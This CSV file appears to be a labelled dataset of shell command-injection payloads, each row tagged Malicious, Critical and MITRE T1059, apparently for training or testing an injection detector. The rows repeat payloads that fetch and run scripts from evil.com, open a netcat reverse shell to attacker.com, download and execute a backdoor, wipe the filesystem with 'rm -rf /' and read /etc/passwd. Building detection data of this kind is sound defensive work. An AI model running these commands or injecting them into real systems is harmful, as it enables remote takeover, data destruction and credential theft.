Payload,Signature,AttackType,Severity,MITRE,Label,Description
; curl http://evil.com/shell.sh | bash,Command Injection,Command Injection,Critical,T1059,Malicious,Command Injection attack attempt
&& nc -e /bin/sh attacker.com 4444,Command Injection,Command Injection,Critical,T1059,Malicious,Command Injection attack attempt
"; echo ""vulnerable"" > /tmp/pwned.txt",Command Injection,Command Injection,Critical,T1059,Malicious,Command Injection attack attempt
| powershell -enc BASE64_ENCODED_COMMAND,Command Injection,Command Injection,Critical,T1059,Malicious,Command Injection attack attempt
| cat /etc/passwd,Command Injection,Command Injection,Critical,T1059,Malicious,Command Injection attack attempt
&& nc -e /bin/sh attacker.com 4444,Command Injection,Command Injection,Critical,T1059,Malicious,Command Injection attack attempt
&& nc -e /bin/sh attacker.com 4444,Command Injection,Command Injection,Critical,T1059,Malicious,Command Injection attack attempt
; ping -c 10 attacker.com,Command Injection,Command Injection,Critical,T1059,Malicious,Command Injection attack attempt
; ping -c 10 attacker.com,Command Injection,Command Injection,Critical,T1059,Malicious,Command Injection attack attempt
"; echo ""vulnerable"" > /tmp/pwned.txt",Command Injection,Command Injection,Critical,T1059,Malicious,Command Injection attack attempt
; ping -c 10 attacker.com,Command Injection,Command Injection,Critical,T1059,Malicious,Command Injection attack attempt
; curl http://evil.com/shell.sh | bash,Command Injection,Command Injection,Critical,T1059,Malicious,Command Injection attack attempt
| cat /etc/passwd,Command Injection,Command Injection,Critical,T1059,Malicious,Command Injection attack attempt
; rm -rf /,Command Injection,Command Injection,Critical,T1059,Malicious,Command Injection attack attempt
| cat /etc/passwd,Command Injection,Command Injection,Critical,T1059,Malicious,Command Injection attack attempt
| netstat -an,Command Injection,Command Injection,Critical,T1059,Malicious,Command Injection attack attempt
; ping -c 10 attacker.com,Command Injection,Command Injection,Critical,T1059,Malicious,Command Injection attack attempt
&& whoami,Command Injection,Command Injection,Critical,T1059,Malicious,Command Injection attack attempt
&& wget http://evil.com/backdoor.sh -O /tmp/backdoor.sh && chmod +x /tmp/backdoor.sh && /tmp/backdoor.sh,Command Injection,Command Injection,Critical,T1059,Malicious,Command Injection attack attempt
&& whoami,Command Injection,Command Injection,Critical,T1059,Malicious,Command Injection attack attempt
; curl http://evil.com/shell.sh | bash,Command Injection,Command Injection,Critical,T1059,Malicious,Command Injection attack attempt
; rm -rf /,Command Injection,Command Injection,Critical,T1059,Malicious,Command Injection attack attempt
&& whoami,Command Injection,Command Injection,Critical,T1059,Malicious,Command Injection attack attempt
| cat /etc/passwd,Command Injection,Command Injection,Critical,T1059,Malicious,Command Injection attack attempt
; rm -rf /,Command Injection,Command Injection,Critical,T1059,Malicious,Command Injection attack attempt
; rm -rf /,Command Injection,Command Injection,Critical,T1059,Malicious,Command Injection attack attempt
| powershell -enc BASE64_ENCODED_COMMAND,Command Injection,Command Injection,Critical,T1059,Malicious,Command Injection attack attempt
; ping -c 10 attacker.com,Command Injection,Command Injection,Critical,T1059,Malicious,Command Injection attack attempt
| cat /etc/passwd,Command Injection,Command Injection,Critical,T1059,Malicious,Command Injection attack attempt
; curl http://evil.com/shell.sh | bash,Command Injection,Command Injection,Critical,T1059,Malicious,Command Injection attack attempt
&& whoami,Command Injection,Command Injection,Critical,T1059,Malicious,Command Injection attack attempt
&& whoami,Command Injection,Command Injection,Critical,T1059,Malicious,Command Injection attack attempt
&& whoami,Command Injection,Command Injection,Critical,T1059,Malicious,Command Injection attack attempt
; ping -c 10 attacker.com,Command Injection,Command Injection,Critical,T1059,Malicious,Command Injection attack attempt
| cat /etc/passwd,Command Injection,Command Injection,Critical,T1059,Malicious,Command Injection attack attempt
&& wget http://evil.com/backdoor.sh -O /tmp/backdoor.sh && chmod +x /tmp/backdoor.sh && /tmp/backdoor.sh,Command Injection,Command Injection,Critical,T1059,Malicious,Command Injection attack attempt
| netstat -an,Command Injection,Command Injection,Critical,T1059,Malicious,Command Injection attack attempt
; curl http://evil.com/shell.sh | bash,Command Injection,Command Injection,Critical,T1059,Malicious,Command Injection attack attempt
; curl http://evil.com/shell.sh | bash,Command Injection,Command Injection,Critical,T1059,Malicious,Command Injection attack attempt
| cat /etc/passwd,Command Injection,Command Injection,Critical,T1059,Malicious,Command Injection attack attempt
; ping -c 10 attacker.com,Command Injection,Command Injection,Critical,T1059,Malicious,Command Injection attack attempt
; ping -c 10 attacker.com,Command Injection,Command Injection,Critical,T1059,Malicious,Command Injection attack attempt
| cat /etc/passwd,Command Injection,Command Injection,Critical,T1059,Malicious,Command Injection attack attempt
; rm -rf /,Command Injection,Command Injection,Critical,T1059,Malicious,Command Injection attack attempt
"; echo ""vulnerable"" > /tmp/pwned.txt",Command Injection,Command Injection,Critical,T1059,Malicious,Command Injection attack attempt
; ping -c 10 attacker.com,Command Injection,Command Injection,Critical,T1059,Malicious,Command Injection attack attempt
&& whoami,Command Injection,Command Injection,Critical,T1059,Malicious,Command Injection attack attempt
&& nc -e /bin/sh attacker.com 4444,Command Injection,Command Injection,Critical,T1059,Malicious,Command Injection attack attempt
| powershell -enc BASE64_ENCODED_COMMAND,Command Injection,Command Injection,Critical,T1059,Malicious,Command Injection attack attempt
; ping -c 10 attacker.com,Command Injection,Command Injection,Critical,T1059,Malicious,Command Injection attack attempt
; rm -rf /,Command Injection,Command Injection,Critical,T1059,Malicious,Command Injection attack attempt
&& wget http://evil.com/backdoor.sh -O /tmp/backdoor.sh && chmod +x /tmp/backdoor.sh && /tmp/backdoor.sh,Command Injection,Command Injection,Critical,T1059,Malicious,Command Injection attack attempt
| powershell -enc BASE64_ENCODED_COMMAND,Command Injection,Command Injection,Critical,T1059,Malicious,Command Injection attack attempt
"; echo ""vulnerable"" > /tmp/pwned.txt",Command Injection,Command Injection,Critical,T1059,Malicious,Command Injection attack attempt
; rm -rf /,Command Injection,Command Injection,Critical,T1059,Malicious,Command Injection attack attempt
; ping -c 10 attacker.com,Command Injection,Command Injection,Critical,T1059,Malicious,Command Injection attack attempt
| cat /etc/passwd,Command Injection,Command Injection,Critical,T1059,Malicious,Command Injection attack attempt
&& nc -e /bin/sh attacker.com 4444,Command Injection,Command Injection,Critical,T1059,Malicious,Command Injection attack attempt
| cat /etc/passwd,Command Injection,Command Injection,Critical,T1059,Malicious,Command Injection attack attempt
&& whoami,Command Injection,Command Injection,Critical,T1059,Malicious,Command Injection attack attempt
&& wget http://evil.com/backdoor.sh -O /tmp/backdoor.sh && chmod +x /tmp/backdoor.sh && /tmp/backdoor.sh,Command Injection,Command Injection,Critical,T1059,Malicious,Command Injection attack attempt
&& nc -e /bin/sh attacker.com 4444,Command Injection,Command Injection,Critical,T1059,Malicious,Command Injection attack attempt
| cat /etc/passwd,Command Injection,Command Injection,Critical,T1059,Malicious,Command Injection attack attempt
| cat /etc/passwd,Command Injection,Command Injection,Critical,T1059,Malicious,Command Injection attack attempt
; ping -c 10 attacker.com,Command Injection,Command Injection,Critical,T1059,Malicious,Command Injection attack attempt
| netstat -an,Command Injection,Command Injection,Critical,T1059,Malicious,Command Injection attack attempt
&& wget http://evil.com/backdoor.sh -O /tmp/backdoor.sh && chmod +x /tmp/backdoor.sh && /tmp/backdoor.sh,Command Injection,Command Injection,Critical,T1059,Malicious,Command Injection attack attempt
&& wget http://evil.com/backdoor.sh -O /tmp/backdoor.sh && chmod +x /tmp/backdoor.sh && /tmp/backdoor.sh,Command Injection,Command Injection,Critical,T1059,Malicious,Command Injection attack attempt
| cat /etc/passwd,Command Injection,Command Injection,Critical,T1059,Malicious,Command Injection attack attempt
&& whoami,Command Injection,Command Injection,Critical,T1059,Malicious,Command Injection attack attempt
&& wget http://evil.com/backdoor.sh -O /tmp/backdoor.sh && chmod +x /tmp/backdoor.sh && /tmp/backdoor.sh,Command Injection,Command Injection,Critical,T1059,Malicious,Command Injection attack attempt
&& nc -e /bin/sh attacker.com 4444,Command Injection,Command Injection,Critical,T1059,Malicious,Command Injection attack attempt
"; echo ""vulnerable"" > /tmp/pwned.txt",Command Injection,Command Injection,Critical,T1059,Malicious,Command Injection attack attempt
"; echo ""vulnerable"" > /tmp/pwned.txt",Command Injection,Command Injection,Critical,T1059,Malicious,Command Injection attack attempt
&& nc -e /bin/sh attacker.com 4444,Command Injection,Command Injection,Critical,T1059,Malicious,Command Injection attack attempt
; rm -rf /,Command Injection,Command Injection,Critical,T1059,Malicious,Command Injection attack attempt
; curl http://evil.com/shell.sh | bash,Command Injection,Command Injection,Critical,T1059,Malicious,Command Injection attack attempt
; curl http://evil.com/shell.sh | bash,Command Injection,Command Injection,Critical,T1059,Malicious,Command Injection attack attempt
| cat /etc/passwd,Command Injection,Command Injection,Critical,T1059,Malicious,Command Injection attack attempt
| powershell -enc BASE64_ENCODED_COMMAND,Command Injection,Command Injection,Critical,T1059,Malicious,Command Injection attack attempt
| cat /etc/passwd,Command Injection,Command Injection,Critical,T1059,Malicious,Command Injection attack attempt
; rm -rf /,Command Injection,Command Injection,Critical,T1059,Malicious,Command Injection attack attempt
; curl http://evil.com/shell.sh | bash,Command Injection,Command Injection,Critical,T1059,Malicious,Command Injection attack attempt
| cat /etc/passwd,Command Injection,Command Injection,Critical,T1059,Malicious,Command Injection attack attempt
; ping -c 10 attacker.com,Command Injection,Command Injection,Critical,T1059,Malicious,Command Injection attack attempt
; ping -c 10 attacker.com,Command Injection,Command Injection,Critical,T1059,Malicious,Command Injection attack attempt
&& nc -e /bin/sh attacker.com 4444,Command Injection,Command Injection,Critical,T1059,Malicious,Command Injection attack attempt
"; echo ""vulnerable"" > /tmp/pwned.txt",Command Injection,Command Injection,Critical,T1059,Malicious,Command Injection attack attempt
"; echo ""vulnerable"" > /tmp/pwned.txt",Command Injection,Command Injection,Critical,T1059,Malicious,Command Injection attack attempt
&& whoami,Command Injection,Command Injection,Critical,T1059,Malicious,Command Injection attack attempt
; curl http://evil.com/shell.sh | bash,Command Injection,Command Injection,Critical,T1059,Malicious,Command Injection attack attempt
; curl http://evil.com/shell.sh | bash,Command Injection,Command Injection,Critical,T1059,Malicious,Command Injection attack attempt
; curl http://evil.com/shell.sh | bash,Command Injection,Command Injection,Critical,T1059,Malicious,Command Injection attack attempt
; rm -rf /,Command Injection,Command Injection,Critical,T1059,Malicious,Command Injection attack attempt
| netstat -an,Command Injection,Command Injection,Critical,T1059,Malicious,Command Injection attack attempt
| powershell -enc BASE64_ENCODED_COMMAND,Command Injection,Command Injection,Critical,T1059,Malicious,Command Injection attack attempt
; ping -c 10 attacker.com,Command Injection,Command Injection,Critical,T1059,Malicious,Command Injection attack attempt
| powershell -enc BASE64_ENCODED_COMMAND,Command Injection,Command Injection,Critical,T1059,Malicious,Command Injection attack attempt
&& whoami,Command Injection,Command Injection,Critical,T1059,Malicious,Command Injection attack attempt
